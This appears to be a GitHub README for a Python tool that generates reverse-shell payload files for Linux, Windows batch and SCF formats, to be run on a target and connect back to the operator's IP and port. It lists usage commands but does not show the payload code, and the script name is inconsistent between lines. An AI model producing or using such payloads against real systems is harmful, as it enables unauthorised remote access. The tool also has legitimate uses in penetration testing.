# autorev.sh  
The Python Script will generate a (.)extension file with reverse shell codes then you can execute the script on the target [support windows and linux both]
## Generating linux  
```
python3 autorev.py -i <your-ip> -p <your-port> -o <sh-file-name> -f lin
```
![alt text](https://github.com/root-tanishq/autorev.sh/blob/main/images/linux.png)  
## Generating Windows
```
python3 autorev.sh -i <your-ip> -p <your-port> -o <batch-file-name> -f win
```
![alt text](https://github.com/root-tanishq/autorev.sh/blob/main/images/window.png)  
### Generating scf
```
python3 autorev.sh -i <your-ip> -p <your-port> -o <scf-file-name> -f scf
```
![alt text](https://github.com/root-tanishq/autorev.sh/blob/main/images/scf.png)  
All Usage commands will be also generated and print according to the given switches
### Suggested shell handler - [penelope](https://github.com/brightio/penelope) [Only for linux]
